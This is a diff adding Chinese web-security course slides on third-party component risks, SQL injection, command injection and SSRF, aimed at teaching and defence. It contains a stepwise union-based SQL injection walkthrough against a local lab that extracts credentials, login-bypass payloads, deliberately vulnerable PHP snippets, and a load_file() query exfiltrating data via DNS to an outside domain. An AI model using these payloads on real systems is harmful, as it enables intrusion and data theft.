@@ -1096,6 +1096,114 @@ print(urlencode($payload)); // urlencode() 结果是为了方便使用 curl 时�
 
 ---
 
+> 所有 Web 应用程序（甚至连操作系统都没有例外）都依靠由第三方开发和提供的各种软件组件，包括开源组件和商用组件。
+
+---
+
+## 心脏滴血
+
+[2014 年 4 月，知名开源安全组件 OpenSSL 被爆「心脏滴血」漏洞](https://heartbleed.com/)
+
+* 利用该漏洞，攻击者可以直接读取远程服务器上的内存数据，其中包括大量运行时的明文密钥、明文口令等机密数据
+* 攻击者借助恢复出的密钥和口令等，又可以进一步获取远程服务器的高权限 
+
+---
+
+* 由于「依赖于」 OpenSSL 库，Apache 和 Nginx 服务器是当时的重灾区软件
+    * 彼时，根据 [Netcraft 2014 年 4 月的 Web 服务器市占率统计](https://news.netcraft.com/archives/2014/04/02/april-2014-web-server-survey.html) ，全球 66% 的网站使用了这 2 种服务器软件搭建。这就意味着这部分网站如果没有特别的缓解或防护措施，将无一幸免于这次大规模的漏洞攻击事件
+
+---
+
+## 心脏滴血之后的 OpenSSL 后浪 {id="openssl-forks"}
+
+* 2014 年「心脏滴血」漏洞引发的全球各地网络攻击事件直接促使了 `OpenSSL` 的一个新分支 [LibreSSL](https://www.libressl.org/) 的诞生
+    * 该项目诞生之初的目标就是为了重构 `OpenSSL` 代码，改进安全性
+* 2018 年百度安全实验室开源使用 `Rust` 语言重写的兼容 `OpenSSL` 的跨平台组件 [MesaLink](https://mesalink.io/)
+    * 主打 `Rust` 语言的内存安全特性
+    * `MesaLink` 的一个主要应用场景是嵌入式智能设备，例如安卓手机平板、智能音箱、智能电视等
+
+---
+
+## Struts2 之殇 {id="struts2-vulnerabilities-1"}
+
+![](images/chap0x07/struts-on-wooyun.png)
+
+---
+
+## Struts2 之殇 {id="struts2-vulnerabilities-2"}
+
+![](images/chap0x07/struts-on-cnvd.png)
+
+---
+
+## Struts2 之殇 {id="struts2-vulnerabilities-3"}
+
+* [Struts2 官方的漏洞公告页面](https://cwiki.apache.org/confluence/display/WW/Security+Bulletins)
+* [CVEDetails 统计的 Apache Struts 漏洞（缺少2019年和2020年的漏洞信息统计）](https://www.cvedetails.com/product/6117/Apache-Struts.html?vendor_id=45)
+
+![](images/chap0x07/struts2-stats.png)
+
+---
+
+> 即使自己编写的代码遵循了最佳安全实践，从代码层面规避了种种安全漏洞，但如果对于依赖的第三方组件出现的漏洞视而不见，开发上线的系统最终仍然难逃被漏洞攻击的命运
+
+---
+
+## Web 应用中常见第三方组件 {id="web-3rd-party-components"}
+
+* 富文本编辑器
+    * CKeditor、FCKeditor
+* 通用开发框架
+    * Java Struts 2，PHP （Laravel / ThinkPHP / Yii2），Python（Django，Flask）
+* 常用开发库
+    * Java Apache Commons Collections，OpenSSL（密码学相关），ImageMagick（图像处理），ffmpeg（视频处理）, fastjson
+
+---
+
+## 安全加固方案 {id="web-3rd-party-harden"}
+
+* 持续执行监控流程，获取新型安全漏洞的通知、新发布的安全补丁和定期漏洞扫描程序
+
+---
+
+## 延伸到供应链安全
+
+1. **开发环节** 。软硬件开发环境、开发工具、 **第三方库** 等。
+2. 交付环节。下载、安装光盘、应用商店等。
+3. 使用环节。软件升级、维护等。
+
+---
+
+### 开发工具之殇
+
+* [Xcode 非官方版本恶意代码污染事件](https://www.antiy.com/response/xcodeghost.html)。
+    * 截止到 2015 年 9 月 20 日，各方已经累计发现当前已确认共 692 种（如按版本号计算为 858 个）App 曾受到污染，受影响的厂商中包括了 **微信、滴滴、网易云音乐** 等著名应用
+* 2017年8月，非常流行的远程终端管理软件 [Xshell 被发现植入了后门代码](https://mp.weixin.qq.com/s/I6cJ7xgT5mTESL0TXa1DBw) ，导致大量使用此款工具的用户泄露主机相关的敏感信息
+
+---
+
+### 过时的第三方组件
+
+[![asciicast](https://asciinema.org/a/3SAg12gM7RqlUFsiapY7yDBr5.svg)](https://asciinema.org/a/3SAg12gM7RqlUFsiapY7yDBr5)
+
+---
+
+### 随时可能拖后腿的基础设施
+
+![](images/chap0x07/dns-poison.png)
+
+---
+
+### Python 第三方组件仓库投毒 {id="pypi-poison"}
+
+[![](images/chap0x07/pypi-poison.png)](https://www.bleepingcomputer.com/news/security/ten-malicious-libraries-found-on-pypi-python-package-index/)
+
+---
+
+### Npm 第三方组件仓库投毒 {id="npmjs-poison"}
+
+[![](images/chap0x07/npmjs-poison.png)](https://www.npmjs.com/search?q=Malicious%20Package)
+
 # 后台相关漏洞
 
 ---
@@ -1108,19 +1216,318 @@ print(urlencode($payload)); // urlencode() 结果是为了方便使用 curl 时�
 
 ---
 
+* SQL 注入在今天来看是一项「古老」但「威力巨大」的远程网络攻击技术
+* 「古老」：最早公开讨论 SQL 注入技术原理的是在 1998 年著名黑客杂志《Phrack》第 54 期上一篇名为 [NT Web Technology Vulnerabilities](http://www.phrack.org/issues/54/8.html#article) 的文章
+    * 在这篇文章里作者举了一个针对 `MS SQL server 6.5` 的 SQL 注入的例子，如下所示：
+
+```sql
+-- MS SQL server 支持批量执行 SQL 语句
+-- 以下 %% %% 之间的内容是「来自 Web 客户端用户可以控制输入的数据」
+SELECT * FROM table WHERE x=%%criteria from webpage user%%
+
+-- 如果攻击者构造的输入数据如下
+1 SELECT * FROM sysobjects
+
+-- 则最终在数据库中执行的 SQL 语句就变为了
+-- 一次执行了 2 条 SQL 语句
+-- 且第 2 条 SQL 语句的执行结果会覆盖第一条 SQL 语句执行的结果
+-- 最终攻击者成功访问到了 sysobjects 表中的所有数据
+SELECT * FROM table WHERE x=1 SELECT * FROM sysobjects
+```
+
+---
+
+上述例子展示了 `SQL 注入攻击` 的一个典型利用效果： **越权读取数据** 。
+
+---
+
 ## 推荐训练学习资源 {id="sqli-labs"}
 
 * [sqli-labs](https://github.com/c4pr1c3/sqli-labs) | [sqli-labs 国内 gitee 镜像](https://gitee.com/c4pr1c3/sqli-labs)
+* [MySQL 手册](https://dev.mysql.com/doc/refman/8.0/en/sql-data-manipulation-statements.html)
 
 ---
+
+## 课内演示环境快速搭建
+
+```bash
+git clone https://github.com/c4pr1c3/sqli-labs
+cd sqli-labs && docker-compose up -d
+
+# 浏览器访问 sqli-labs http://<ip-to-your-host>:7080/
+# 点击页面上的「Setup/reset Database for labs」初始化数据库
+# http://<ip-to-your-host>:7080/sql-connections/setup-db.php
+
+# 浏览器访问 adminer 网页版方式管理数据库 http://<ip-to-your-host>:7081/
+# 方便调试 SQL 注入 payload
+
+# 如果需要通过命令行连接 mysql 容器可以自行修改 docker-compose.yml 增加数据库容器的端口映射规则
+```
+
+---
+
+## 从经典的登录绕过漏洞开始
+
+> sqli-labs 里的 Lesson-11 Post - Error Based - Single quotes - String
+
+![](images/chap0x07/sqli-labs-lesson-11.png)
+
+---
+
+### 缺陷代码解析
+
+```php
+@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
+$result=mysql_query($sql);
+$row = mysql_fetch_array($result);
+```
+
+---
+
+### 在 SQL 控制台里调试关键注入语句 {id="sql-debug"}
+
+```sql
+/* 正常登录过程 */
+SELECT username, password FROM users WHERE username='admin' and password='admin' LIMIT 0,1
+
+/* SQL 注入登录过程 */
+
+-- 用户名字段输入随意，例如 1 密码字段输入 1' or 1 -- （注意 -- 左右两边各有一个空格）
+SELECT username, password FROM users WHERE username='admin' and password='1' or 1 -- ' LIMIT 0,1
+
+-- 用户名字段输入 admin' --  （注意 -- 左右两边各有一个空格）密码字段输入随意
+SELECT username, password FROM users WHERE username='admin' -- ' and password='1' LIMIT 0,1
+```
+
+---
+
+## SQL 注入漏洞发现与利用的一般步骤 {id="sqli-procedure"}
+
+* 确认漏洞注入点存在
+    * 有报错回显
+        * 枚举/猜解：列数 --> 数据库版本 --> 表名 --> 列名 --> 具体值
+    * 无报错回显 --> SQL 盲注
+        * 利用 SQL 代码延迟执行时间差
+        * 利用 SQL 代码执行返回结果差异制造页面渲染结果差别
+
+---
+
+## 课内动手实验 {id="sqli-inclass-exp"}
+
+利用 `sqli-labs` 里的 `Lesson-2 GET - Error based - Intiger based` 学习 `有报错回显` 经典 SQL 注入方法。
+
+```bash
+# 1. 判断注入点是否存在
+
+http://192.168.56.144:7080/Less-2/?id=2'
+
+# 2. 枚举字段数
+
+http://192.168.56.144:7080/Less-2/?id=2 order by 1
+http://192.168.56.144:7080/Less-2/?id=2 order by 2
+http://192.168.56.144:7080/Less-2/?id=2 order by 3
+# 4 时报错，说明当前查询对应的结果集数量（如果是单表查询则说明当前表的列数）为 3
+http://192.168.56.144:7080/Less-2/?id=2 order by 4
+
+# 3. 检查是否支持 union 查询
+# 第一次页面返回结果无变化
+http://192.168.56.144:7080/Less-2/?id=2 union all select 1,2,3 -- 
+# 第二次页面返回结果原先 name 字段显示 2 password 字段显示 3
+# 说明返回结果集合的第2和第3个字段值分别对应在这 2 个位置上回显输出
+http://192.168.56.144:7080/Less-2/?id=2 union all select 1,2,3 limit 1,1 -- 
+
+# 4. 获取数据库版本信息、数据库连接权限和当前数据库实例名
+http://192.168.56.144:7080/Less-2/?id=2 union all select 1,concat(version(),0x3a,user(),0x3a,database()),3 limit 1,1 -- 
+
+# 5. 获取表名
+# mysql < 5 只能靠字典爆破方式获取表名和列名
+# mysql >= 5 可以通过查询系统库 information_schema 获取
+# 以下逐一枚举系统中所有表名
+http://192.168.56.144:7080/Less-2/?id=2 union all select 1,table_name,3 from information_schema.tables where table_schema='security' limit 1,1 -- 
+...
+http://192.168.56.144:7080/Less-2/?id=2 union all select 1,table_name,3 from information_schema.tables where table_schema='security' limit 4,1 -- 
+
+# 6. 查询列名
+http://192.168.56.144:7080/Less-2/?id=2 union all select 1,column_name,3 from information_schema.columns where table_name='users'  limit 1,1 -- 
+http://192.168.56.144:7080/Less-2/?id=2 union all select 1,column_name,3 from information_schema.columns where table_name='users' limit 2,1 -- 
+http://192.168.56.144:7080/Less-2/?id=2 union all select 1,column_name,3 from information_schema.columns where table_name='users' limit 3,1 -- 
+
+# 7. 获取表内数据
+http://192.168.56.144:7080/Less-2/?id=2 union all select 1,concat(id,0x3a,username,0x3a,password),3 from users limit 1,1 -- 
+http://192.168.56.144:7080/Less-2/?id=2 union all select 1,concat(id,0x3a,username,0x3a,password),3 from users limit 2,1 -- 
+...
+
+# TODO 总结以上手工测试过程，编写自动化脚本
+```
+
+---
+
+## SQL 注入攻击的自动化工具 {id="sqli-tools"}
+
+[sqlmap](http://sqlmap.org/)
+
+---
+
+## SQL 手工注入方法与技巧学习 {id="sqli-tutorials"}
+
+* [Full SQL Injection Tutorial (MySQL)](https://www.exploit-db.com/papers/13045)
+* 分析 [sqlmap](http://sqlmap.org/) 的流量
+
+---
+
+## SQL 注入攻击的典型危害 {id="sqli-impacts"}
+
+* 越权读取数据
+* 绕过访问控制
+* 篡改数据
+* 写文件
+* 读文件
+* 代码执行
+
+---
+
+## SQL 注入攻击的防御 {id="prevention-to-sqli"}
+
+* 代码级别 **一劳永逸** 修复
+    * 使用 [预编译 SQL 语句](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html#:~:text=This%20coding%20style%20allows%20the,are%20inserted%20by%20an%20attacker.)
+* 纵深防御措施
+    * 最小化数据库连接权限
+    * 输入数据白名单
+* 缓解措施
+    * 使用 `Web 应用防火墙` （WAF）
+
 
 # 11. 命令注入 {id="command-injection"}
 
 ---
 
+* 命令注入有时也称为代码注入，两者在大部分场景下具有相同的含义
+* `SQL 注入` 本身就是一种特殊的 `命令注入` ：针对 `SQL 服务器` 的 `命令注入`
+
+---
+
+## shell 命令注入 {id="shell-cmdi"}
+
+[![shell 命令注入漏洞演示](https://asciinema.org/a/tKaq8ngneFOr6O96q8ZsBC4L8.svg)](https://asciinema.org/a/tKaq8ngneFOr6O96q8ZsBC4L8)
+
+---
+
+## shell 命令注入漏洞的代码级别防御 {id="prevention-to-cmdi"}
+
+以 `PHP` 为例（其他语言类似）
+
+* 输入数据过滤
+    * `shell` 命令过滤: [escapeshellcmd](https://www.php.net/manual/zh/function.escapeshellcmd.php) 
+    * `shell` 命令 **参数** 过滤：[escapeshellarg](https://www.php.net/manual/zh/function.escapeshellarg.php)
+
+---
+
+### 过滤是把“双刃剑” {id="filter-is-a-double-sword-1"}
+
+> 同时使用以上这 2 个过滤函数是否防御效果加倍呢？
+
+---
+
+### 过滤是把“双刃剑” {id="filter-is-a-double-sword-2"}
+
+[PHPMailer 小于 5.2.18 版本的 RCE 漏洞，官方在补丁中使用了 escapeshellarg() 来修复漏洞](https://paper.seebug.org/164/)。但在 PHPMailer 的 `mail.c` 的函数内部又使用了一遍 `escapeshellcmd()` ，导致输入数据中经过 `escapeshellarg()` 处理后单引号先被 **\** 转义一次，再用单引号对输入参数的左右两部分进行了包围处理。后来遇到 `escapeshellcmd()` 处理时，先前被添加的 **\** 又被转义了一次，变成了 **\\**，并且命令中所有的单引号又被转义了一次，最终导致输入参数又变回了一个可以被执行的操作系统命令。
+
+---
+
+## 表达式注入漏洞
+
+* [公开资料可以找到的最早讨论表达式注入漏洞的文章是 2011 年 Stefano 和 Arshan 联合发表的Expression Language Injection](https://www.mindedsecurity.com/fileshare/ExpressionLanguageInjection.pdf)
+    * Spring MVC 框架中 Spring MVC JSP 标签可以执行 Java 代码
+    * 涉及到的表达式语言引擎包括：Struts 2 的 OGNL，Spring 的 SPEL 等
+* Apache Struts 2 的 [S2-014](https://cwiki.apache.org/confluence/display/WW/S2-014) 就是一个典型的表达式注入漏洞，官方漏洞危害评级为：高危
+* 另一个知名的 Java 企业级 Web 开发流行框架 Spring 在历史上同样爆出过表达式注入漏洞
+    * 例如 [CVE-2016-4977](https://nvd.nist.gov/vuln/detail/CVE-2016-4977)、[CVE-2017-4971](https://nvd.nist.gov/vuln/detail/CVE-2017-4971)、[CVE-2018-1270](https://nvd.nist.gov/vuln/detail/CVE-2018-1270)和[CVE-2018-1273](https://nvd.nist.gov/vuln/detail/CVE-2018-1273)
+
+---
+
+> 截止目前，表达式注入漏洞均发生在 Java 程序之中，未来其他的 Web 开发技术也有可能出现这种类似的表达式存在，有鉴于已有的这些表达式漏洞的危害巨大。届时，表达式注入漏洞可能将成为 Web 应用程序漏洞挖掘的一个重要方向。
+
+---
+
+## 小结 {id="summary-of-cmdi"}
+
+* 和前述输入相关的通用漏洞一样， **数据输入过滤** 是防御命令注入漏洞的基本方法
+* 「插件」和「安全」需要兼顾
+    * 纵深防御机制，而不仅仅是在代码级别的安全加固保障
+        * 沙盒环境运行代码
+        * 最小化权限运行代码
+        * 网络隔离与最小化子网划分
+
 # 12. 服务端请求伪造 {id="ssrf"}
 
 ---
+
+**Server** Side Request Foregery, SSRF
+
+---
+
+* `文件包含`、`XXE 注入`、`反序列化漏洞` 都可以被用来构造和触发 `SSRF`
+    * 这就是典型的「组合漏洞」和「链式漏洞利用」
+* 严格来说，`SSRF` 不是一种独立 **漏洞类型** ，而是一种 **漏洞利用类型**
+
+---
+
+## 一段 SSRF 风险代码 {id="ssrf-code-snippet"}
+
+```php
+<?php
+function curl($url){
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_HEADER, 0);
+    curl_exec($ch);
+    curl_close($ch);
+}
+$url = $_GET['url'];
+curl($url);
+```
+
+---
+
+由于 curl 支持的协议类型非常广泛（根据官网描述可知有不下 20 种网络协议均可以通过 curl 访问读取），因此上述漏洞代码可以访问诸如：服务器上本地文件（利用 ``file://``）和远程 Web 服务器上的文件（利用 ``http://`` 和 ``https://``）等等。
+
+---
+
+## 另类 SSRF {id="ssrf-misc"}
+
+* 除了文件读取时容易造成 SSRF 漏洞（例如文档、图片、音视频处理等在接受文件路径输入参数时很可能同时支持本地和网络协议 URL）
+* 数据库的一些内置功能（加载网络地址时会自动对其中包含的域名字段进行 DNS 查询）也会被利用在 SQL 注入的过程中获取数据
+
+---
+
+### SQL 注入过程中的 SSRF {id="ssrf-in-sqli"}
+
+以 [sqlmap](http://sqlmap.org/) 为例，在其众多数据获取技巧中提供了一个命令行参数 `--dns-domain` 就是实现了利用 SQL 数据库在执行一些特定函数时会对其中传入的参数当作域名进行查询这个特性的 `基于 DNS 的带外数据回传`
+
+---
+
+```sql
+select load_file(concat('\\\\', version(), '.6a7087aa4e3b2c743ed1.d.zhack.ca\\1.txt'));
+```
+
+成功执行上述 SQL 代码将会在 [dnsbin.zhack.ca](http://dnsbin.zhack.ca/)  的 DNS 解析服务器上留下一条 DNS 查询记录，如下图所示：
+
+![](images/chap0x07/dnsbin-1.png)
+
+---
+
+* 需要注意的是，MySQL 的全局配置参数 [secure_file_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv) 的设定会影响到 `load_file()` 是否解析参数中包含的域名
+    * 在从 MySQL 官网下载的 5.7.16 之前独立安装包版本或 5.7.5 之前所有版本的 `secure_file_priv` 缺省设置均为空，则上述攻击代码能得手
+    * 但如果设置为 NULL 则会禁用文件读取操作，如果设置为指定目录，则只能从指定目录读取文件
+
+---
+
+## 小结
+
+* SSRF 漏洞既可以发生在服务器端脚本所在的主机，也可能发生在后台服务（如上文中举例的数据库）主机
+* SSRF 漏洞一旦被利用可以被用来进行内网服务发现和扫描、作为跳板攻击内网或本地应用程序和 Web 应用等，甚至是任意读取 SSRF 漏洞触发所在主机上的本地文件
+* 防御 SSRF 漏洞的基本方法除了输入相关的通用漏洞防御方法之外，对于重要的后台服务启用 `身份认证` 和 `二次鉴权` 可以有效的缓解 SSRF 的漏洞利用效果
+
 
 # 输出相关漏洞
 
